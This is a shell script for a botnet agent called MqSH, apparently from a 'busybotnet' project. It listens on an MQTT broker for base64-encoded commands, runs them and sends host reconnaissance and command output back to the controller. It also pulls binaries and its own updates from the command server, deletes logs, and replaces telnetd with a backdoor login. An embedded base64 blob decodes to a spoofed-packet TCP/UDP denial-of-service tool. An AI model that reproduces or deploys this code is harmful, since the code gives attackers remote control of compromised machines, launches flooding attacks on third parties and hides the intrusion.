#            __   __       			 
#      |\/| /  \ /__` |__| 			 
#      |  | \__X .__/ |  | 	
# Message Queing Telemetry Transport Shell	 
# https://github.com/isdrupter/busybotnet


jsonify(){ # Turn shell output into json
tempf=/tmp/.mqsh/jshcmd
input=/tmp/.mqsh/_cmd_
echo $@ > $tempf
bbj="$(jshon -Qs 2>/dev/null 1>/dev/null)"
ip=$bbj"$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)"
unixtime=$bbj"$(date +%s)"
date=$bbj"$(date)"
uptime=$bbj"$(uptime | sed s/\,//)"
kernelcmdline=$bbj"$(cat /proc/cmdline)"
id=$bbj"$(id)"
kcrypto=$bbj"$(cat /proc/crypto | grep name | cut -d':' -f2 | uniq | tr -s '\n' ' '|sed s/\,//)"
version=$bbj"$(cat /proc/version)"
memstat=$bbj"$(cat /proc/meminfo | head -n 3 | tr -s '\n' ' ')"
cwd=$bbj"$(pwd)"
shell=$bbj"$(echo $SHELL)"
getstty=$bbj"$(stty)"
term=$bbj"$(echo $TERM)"
cpuname=$bbj"$(cat /proc/cpuinfo | grep name)"
status=$bbj"$(if ([ -s /tmp/.status ] && [ -f /tmp/.status ]); then echo "SYSTEM_BUSY" ; else echo "SYSTEM_READY";fi)"
hashcmd=$bbj"$(md5sum $tempf | sed -e 's/\  \/tmp\/.mqsh\/jshcmd\>//g')"
uuid=$bbj"'$unixtime.$hashcmd'"
output=$bbj"'$(ash $tempf)'"
cmdline=$bbj"$(echo $(cat $input))"

echo '{
"ip" : "'$ip'",
"unixtime": "'$unixtime'",
"date": "'$date'",
"uptime" : "'$uptime'",
"cpuname": "'$cpuname'",
"memstat" : "'$memstat'",
"id" : "'$id'",
"version" : "'$version'",
"kernel_cmdline": "'$kernelcmdline'",
"kernel_crypto": "'$kcrypto'",
"shell": "'$shell'",
"term": "'$term'",
"stty": "'$getstty'",
"cwd": "'$cwd'",
"uuid": "'$uuid'",
"status": "'$status'",
"cmdline": "'$cmdline'",
"output": "'$output'"
}' 2>>$errorlog
}

publish(){
uxt=$(date +%s)
jshout=$workdir/jshout.$uxt
jshin=$workdir/_cmd_
[ $debug == "1" ] && echo "[<<] Publishing output to topic $pubtop on $host"
echo "$input" >$jshin
(jsonify "cat $out" | base64) 2>> $errorlog > $jshout
if ([[ "$?" -eq "0" ]] && [[ -s $out ]]); then
  pubclient -h $host -i ${ip} -q 1 -t "data/$pubtop" -u bot -P $pass -f $jshout
fi
rm -f $out $jshout $jshin 2>/dev/null
}

execute(){
input="$@"
uxt=$(date +%s)
temp=$(mktemp cmd.XXXXXX);rm $temp
piddir=/tmp/.mqsh/pids
case "$@" in *)
_cmd_="${workdir}/${temp}"
printf 'export thrdpid=$(mktemp XXXXXX);rm $thrdpid \necho "$$" > /tmp/.mqsh/pids/${thrdpid}.pid \n' >$_cmd_
echo $@ >> $_cmd_
out="$workdir/output.${uxt}"
(((bash $_cmd_) ;wait) 2>> $errorlog > $out );\
((if [[ -s $out ]] ; then publish $out "$input" & else rm $out;fi &)&)
for i in `ls $piddir`;do if ! ps|grep `cat $piddir/$i`|grep -v 'grep' >/dev/null;then rm $piddir/$i;fi ;done
rm -f $_cmd_
esac
[ $debug == "1" ] && echo '[<<] Executed command in a thread'
} 

repoGet(){ # Download, verify, and install binaries/scripts
checkhash(){
bin="$1";hash="$2"
if (echo $hash *$bin | sha1sum -c -) > /dev/null 2>&1 ; then
  return 0
else 
  return 1
fi
}
# Assumes you have an http:server/repo hosting files and sha1sums
getbin="$1"
[ $debug == "1" ] && echo "Getting hash file of $1"
wget -O /tmp/bin.sha1 $host/repo/$getbin.sha1
gethash=$(cat /tmp/bin.sha1)
if ! checkhash /var/bin/$getbin $gethash;then 
  rm /tmp/bin.out; 
  for i in 1 2 3 4 5 ;do 
    [ $debug == "1" ] && echo "Downloading $getbin from repository..."
    wget -O /tmp/bin.out $host/repo/$getbin; 
    if checkhash /tmp/bin.out $gethash;then  
      [[ $debug == "1" ]] && echo "Hash matches!"
      break
    else 
      [[ $debug == "1" ]] && echo "Corrupted file, wait and try again..."
      sleep $(echo $RANDOM|head -c 2)
    fi
  done 
mv /tmp/bin.out /var/bin/$getbin
chmod +x /var/bin/$getbin
fi
}

clearmem(){
rm -f $workdir/cmd.*
>$cwd/nohup.out
rm -f /var/log/h*
}

ctrl_c(){ # If running in debug mode
    echo -en "\n## Caught SIGINT; Clean up and Exit... \n"
    (kill `cat $pidfile` ;\
    rm -rf $workdir ;\
    rm $pipe $enc $denc $pidfile /var/run/mq.pid ;\ 
    kill -9 $$ ;\
    exit) >/dev/null 2>&1
}

quit(){ 
rm $pipe $denc
kill -9 `cat $pidfile`;rm $pidfile
kill -9 $$
[ "debug" == "0" ] && reboot ||\
trap "rm -rf $workdir"
exit
} 


killThreads(){ 
echo '[info] Received killall, killing all threads and messages...'
  for i in $(ls $piddir);do
    echo "Killing $i" >> error.log
    kill -15 $(cat $piddir/$i) # Use -9 if you need, but remember that creates zombies!
  done
  killall pubclient
  for i in `pgrep -f` 'bash /tmp/.mqsh/_cmd_';do kill $i ;done 2>/dev/null
}

run(){
denc=$workdir/denc
[ $debug == "1" ] &&\
echo Host: "$host" ;echo Pass :"$pass" ;echo Debug: "$debug" ;echo Path:"$path"

if [[ ! -p "$pipe" ]]; then mkfifo $pipe ;fi
(subclient -h $host -q 2 -i ${ip} -t shell/${ip} -t shell/${subtop} -u bot -P $pass > $pipe) &\ 
echo "$!" > $pidfile # Daemonize the listener

while true;do # forever and ever (just in case)
while read line; do # read from the pipe
[ $debug == "1" ] &&  echo '[>>] Got a command!'
((echo "${line}" | base64 -d) 2>> $errorlog) >$denc
[ $debug == "1" ] &&  echo '[>>] Echoed line to file.'
if [[ -s "$denc" ]] ; then 

case "$(cat $denc)" in # decide what to do with it
__quit__)
echo '[warn] Received quit, bailing...'
quit
;;

__update__) 
# This still needs more testing. Be careful before trying to update your entire net.
[ debug == "1" ] && \
echo '[warn] Received update, getting new config...'
wget -O $0 $host/mq  # overwrite this file from your httpd
# It may be better to use $ exec $0 , idk
trap "nohup bash $0" 15 # kill this script
kill `cat pidfile`  # and the listener
kill $$ # kill this pid, hopefully triggering the trap
;;

__killall__)
echo '[info] Received a killall, getting new config...'
killThreads & 
;;

_clearmem_)
echo '[info] Received clearenv, deleting the logs...'
clearmem &
;;

_GET_*)
cat $denc | sed s'/_GET_//' >$workdir/get
getBin="$(cat $workdir/get)"
repoGet $getBin &
;;

_SH_*) # Directly run a command, do not parse into json
shcmd=$(cat $denc|sed s'/_SH_//') 
echo $shcmd > /tmp/shcmd
(((bash /tmp/shcmd) 2>$errorlog | base64| pubclient -h $host -i ${ip} -q 1 -t "data/$pubtop" -u bot -P $pass -s;rm -f /tmp/shcmd)&)&
;;

*) # otherwise execute whatever
[ $debug == "1" ] && echo "[*] Received a command, will exec..."
cmd="$(cat $denc)"
execute "${cmd}" & # ALWAYS run background, this must be asynchronous!
if ([[ "$?" -eq "0" ]] && [[ $debug == "1" ]]); then  
  echo '[*] Executed the command...'
fi
;;

esac
fi
done <$pipe
done
}

doFirst(){ # Stuff to do before launch
iptables-save >/tmp/ipt.orig
echo 'nameserver 8.8.8.8' >/tmp/resolv.conf
echo 'nameserver 8.8.4.4' >>/tmp/resolv.conf
>/var/version.1.6
(killall -9 telnetd ;telnetd -l /var/bin/backdoor)&
}

spitSomeBin(){ # Scripts/binaries you want to write at launch
cat << EOF > /tmp/dos 

IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK 

EOF
(cat /tmp/dos | base64 -d > /var/bin/dos  ; chmod +x /var/bin/dos; rm -f /tmp/dos)2>>$errorlog
} 

#######################
# Program start
#######################
cwd=$(pwd)
workdir="/tmp/.mqsh"
piddir="${workdir}/pids"
pipe=$workdir/p
errorlog="$workdir/error.log"
rm -f pipe >/dev/null;>$errorlog

if ([[ "id -u" == "0" ]] || [[ -w /var/run ]]) ; then
  pidfile=/var/run/sub.pid
else
  pidfile=$workdir/sub.pid
fi

if ([ -s $pidfile ] && pidof subclient >/dev/null) ; then 
  [ $debug == "1" ] &&\
  echo "Will not run a clone, killing clones..."
  kill -9 $(cat /var/run/mq.pid) ||
  kill -9 $(cat /var/run/sub.pid) ||  kill -9 $(cat /tmp/sub.pid)
fi

if [[ ! -d $workdir ]]; then 
  mkdir $workdir
fi

if [[ ! -d $piddir ]]; then 
  mkdir $piddir
fi
# Set variables here. Can override on the command line. Run in 
# debug mode (set debug = 1) the first time to see how it works.
host=${1:-"localhost"}
pass=${2:-"password"}
path=${3:-"$PATH:/var/bin"}
debug=${4:-"0"}
intf=${5:-"eth0"}
subtop=${6:-"shell"}
pubtop=${7:-"data"}
ip=$(/sbin/ifconfig $intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
echo "MqSH Version 1.6-----------------------------------------------"
echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
echo "        [[PATH][[default:\$PATH:/var/bin]][[debug][[default:0]]"
echo "		    \ [[nicid]]	[[subtopic]][[pubtopic]]	     "
echo "Options:-------------------------------------------------------"
export PATH=$path
if ([[ "$debug" == "1" ]]);then
  spitSomeBin
  trap "ctrl_c" EXIT INT TERM
  run $host $pass $path $debug $key $intf $subtop $pubtop 
else
  spitSomeBin 2>>$errorlog
  doFirst 2>>$errorlog
  trap "" 1 # don't die if the controlling terminal goes away
  errorlog=/dev/null # not runnin in debug mode, so nullify all errors
  run $host $pass $path $debug $key $intf $subtop $pubtop  2>>$errorlog &
fi


